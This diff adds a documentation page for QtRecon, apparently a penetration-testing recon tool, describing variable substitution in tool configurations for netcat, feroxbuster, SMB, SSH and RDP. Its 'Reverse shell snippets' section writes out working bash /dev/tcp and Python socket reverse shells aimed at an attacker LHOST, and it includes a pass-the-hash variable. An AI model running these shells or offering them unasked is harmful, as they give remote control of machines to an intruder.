@@ -1,0 +1,356 @@
+---
+title: Variables
+description: Dynamic variable substitution in tool configurations
+---
+
+QtRecon supports dynamic variable substitution in tool arguments, allowing you to create flexible tool configurations that adapt to the current reconnaissance context.
+
+## How variables work
+
+Variables use the `%%%VARIABLE_NAME%%%` syntax in tool argument definitions. When a tool is launched, QtRecon automatically replaces these placeholders with actual values from the current context.
+
+### Example
+
+```json
+"netcat": {
+  "name": "Netcat",
+  "binary": "/usr/bin/ncat",
+  "args": ["-nv", "%%%IP%%%", "%%%PORT%%%"]
+}
+```
+
+When launched against `192.168.1.100:80`, this becomes:
+
+```bash
+/usr/bin/ncat -nv 192.168.1.100 80
+```
+
+## Built-in variables
+
+QtRecon provides several built-in variables that are automatically populated based on the scan context.
+
+### Network variables
+
+<ParamField path="%%%IP%%%" type="string">
+  The target IP address being scanned
+  
+  **Example**: `192.168.1.100`
+</ParamField>
+
+<ParamField path="%%%PORT%%%" type="string">
+  The specific port number for the current context
+  
+  **Example**: `443`
+</ParamField>
+
+<ParamField path="%%%PROTO%%%" type="string">
+  The protocol (automatically determined based on port)
+  
+  **Values**: `http` or `https`
+  
+  **Example**: `https` for port 443
+</ParamField>
+
+<ParamField path="%%%HOSTNAME%%%" type="string">
+  The hostname of the target (if resolved)
+  
+  **Example**: `webserver.example.com`
+</ParamField>
+
+### Authentication variables
+
+<ParamField path="%%%USERNAME%%%" type="string">
+  Username for authenticated operations
+  
+  **Example**: `administrator`
+</ParamField>
+
+<ParamField path="%%%PASSWORD%%%" type="string">
+  Password for authenticated operations
+  
+  **Example**: `P@ssw0rd123`
+</ParamField>
+
+<ParamField path="%%%HASH%%%" type="string">
+  Password hash for pass-the-hash attacks
+  
+  **Example**: `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`
+</ParamField>
+
+<ParamField path="%%%SSH_KEY%%%" type="string">
+  Path to SSH private key file
+  
+  **Example**: `/home/user/.ssh/id_rsa`
+</ParamField>
+
+<ParamField path="%%%DOMAIN%%%" type="string">
+  Domain name for Active Directory environments
+  
+  **Example**: `CORP`
+</ParamField>
+
+### Attacker variables
+
+<ParamField path="%%%LHOST%%%" type="string">
+  Local host IP address (attacker machine)
+  
+  Automatically determined from `preferred_interfaces` in `user_prefs`
+  
+  **Example**: `10.10.14.5`
+</ParamField>
+
+<ParamField path="%%%LPORT%%%" type="string">
+  Local port for reverse connections
+  
+  Defaults to value in `user_prefs.preferred_lport`
+  
+  **Example**: `8444`
+</ParamField>
+
+## Custom variables
+
+Define your own variables in the `user_variables` section of the configuration file:
+
+```json
+"user_variables": {
+  "XFREERDP_KEYBOARD": "0x0000040C",
+  "WORDLIST_DIR": "/usr/share/wordlists",
+  "CUSTOM_TIMEOUT": "30"
+}
+```
+
+Then reference them in tool configurations:
+
+```json
+"xfreerdp": {
+  "name": "xfreerdp",
+  "binary": "/usr/bin/xfreerdp",
+  "args": [
+    "/v:%%%IP%%%",
+    "/kbd:%%%XFREERDP_KEYBOARD%%%"
+  ]
+}
+```
+
+### Custom variable example: Keyboard layout
+
+The `XFREERDP_KEYBOARD` variable is particularly useful for RDP connections:
+
+```json
+"user_variables": {
+  "XFREERDP_KEYBOARD": "0x0000040C"
+}
+```
+
+Common keyboard layouts:
+- `0x00000409` - US English
+- `0x0000040C` - French
+- `0x00000407` - German
+- `0x00000809` - UK English
+- `0x0000040A` - Spanish
+
+## Variable usage examples
+
+### Web application testing
+
+Combine multiple variables for comprehensive web scanning:
+
+```json
+"feroxbuster": {
+  "name": "feroxbuster",
+  "binary": "/usr/bin/feroxbuster",
+  "args": [
+    "--url", "%%%PROTO%%%://%%%IP%%%:%%%PORT%%%/",
+    "-w", "/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt"
+  ]
+}
+```
+
+### Authenticated SMB enumeration
+
+Use authentication variables for Windows enumeration:
+
+```json
+"smb_script_authenticated": {
+  "name": "SMB authenticated enum",
+  "binary": "/bin/bash",
+  "args": [
+    "scripts/smb.sh",
+    "%%%IP%%%",
+    "%%%DOMAIN%%%",
+    "%%%USERNAME%%%",
+    "%%%PASSWORD%%%"
+  ]
+}
+```
+
+### SSH with key authentication
+
+```json
+"ssh_key": {
+  "name": "SSH (key auth)",
+  "binary": "/usr/bin/ssh",
+  "in_terminal": true,
+  "detached": true,
+  "args": [
+    "-i", "%%%SSH_KEY%%%",
+    "%%%USERNAME%%%@%%%IP%%%"
+  ]
+}
+```
+
+### RDP with credentials
+
+```json
+"xfreerdp": {
+  "name": "xfreerdp",
+  "binary": "/usr/bin/xfreerdp",
+  "detached": true,
+  "args": [
+    "/v:%%%IP%%%",
+    "/d:%%%DOMAIN%%%",
+    "/u:%%%USERNAME%%%",
+    "/p:%%%PASSWORD%%%",
+    "/cert:ignore",
+    "/drive:tmp,/tmp",
+    "/dynamic-resolution",
+    "/kbd:%%%XFREERDP_KEYBOARD%%%"
+  ]
+}
+```
+
+### Reverse shell snippets
+
+Variables are also used in the `snippets` section:
+
+```bash
+bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1
+```
+
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%%%LHOST%%%",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+## Configuring LHOST and LPORT
+
+The `%%%LHOST%%%` and `%%%LPORT%%%` variables are configured through `user_prefs`:
+
+```json
+"user_prefs": {
+  "preferred_interfaces": ["tun0", "vpn0", "eth0"],
+  "preferred_lport": 8444
+}
+```
+
+<ParamField path="preferred_interfaces" type="array">
+  List of network interfaces in priority order. QtRecon uses the first available interface to determine `%%%LHOST%%%`.
+</ParamField>
+
+<ParamField path="preferred_lport" type="number">
+  Default local port for reverse connections (`%%%LPORT%%%`).
+</ParamField>
+
+<Tip>
+  Put VPN interfaces like `tun0` first in `preferred_interfaces` to ensure reverse shells connect through your VPN during penetration tests.
+</Tip>
+
+## Variable resolution behavior
+
+<AccordionGroup>
+  <Accordion title="Missing variables">
+    If a variable cannot be resolved (e.g., `%%%USERNAME%%%` when no username is set), QtRecon typically:
+    - Prompts you to enter the value before launching the tool
+    - Or leaves the variable as-is if the tool has `"edit_before_launch": true`
+  </Accordion>
+
+  <Accordion title="Protocol auto-detection">
+    `%%%PROTO%%%` is automatically determined:
+    - Port 443, 8443: `https`
+    - Port 80, 8080, 8000: `http`
+    - Other ports: defaults to `http`
+  </Accordion>
+
+  <Accordion title="Variable case sensitivity">
+    Variable names are case-sensitive. Use uppercase: `%%%IP%%%` not `%%%ip%%%`
+  </Accordion>
+
+  <Accordion title="Custom variable priority">
+    Custom variables in `user_variables` can override built-in variables if they use the same name (not recommended).
+  </Accordion>
+</AccordionGroup>
+
+## Best practices
+
+<AccordionGroup>
+  <Accordion title="Use descriptive custom variable names">
+    Choose clear, uppercase names for custom variables:
+    
+    ```json
+    "SECLISTS_PATH": "/usr/share/wordlists/SecLists"
+    ```
+  </Accordion>
+
+  <Accordion title="Validate tool commands manually">
+    Before relying on variables, test the resulting command manually to ensure proper substitution:
+    
+    ```bash
+    # Test what QtRecon will execute
+    /usr/bin/ncat -nv 192.168.1.100 80
+    ```
+  </Accordion>
+
+  <Accordion title="Document custom variables">
+    Add comments (if your JSON parser supports them) or maintain separate documentation for custom variables.
+  </Accordion>
+
+  <Accordion title="Quote variables in shell scripts">
+    When using variables in custom shell scripts, quote them to handle special characters:
+    
+    ```bash
+    #!/bin/bash
+    target="$1"  # %%%IP%%%
+    port="$2"    # %%%PORT%%%
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Complete example
+
+Here's a tool configuration demonstrating multiple variable types:
+
+```json
+"user_variables": {
+  "XFREERDP_KEYBOARD": "0x0000040C",
+  "RDP_RESOLUTION": "1920x1080"
+},
+"user_binaries": {
+  "xfreerdp_full": {
+    "name": "xfreerdp (full)",
+    "text": "Connect to RDP with full options",
+    "binary": "/usr/bin/xfreerdp",
+    "detached": true,
+    "args": [
+      "/v:%%%IP%%%:%%%PORT%%%",
+      "/d:%%%DOMAIN%%%",
+      "/u:%%%USERNAME%%%",
+      "/p:%%%PASSWORD%%%",
+      "/cert:ignore",
+      "/drive:shared,/tmp",
+      "/size:%%%RDP_RESOLUTION%%%",
+      "/kbd:%%%XFREERDP_KEYBOARD%%%",
+      "+clipboard"
+    ]
+  }
+}
+```
+
+## Next steps
+
+<CardGroup cols={2}>
+  <Card title="Tool setup" icon="wrench" href="/configuration/tool-setup">
+    Learn how to configure tools that use variables
+  </Card>
+  <Card title="Autorun rules" icon="bolt" href="/configuration/autorun-rules">
+    Use variables in automated tool execution
+  </Card>
+</CardGroup>
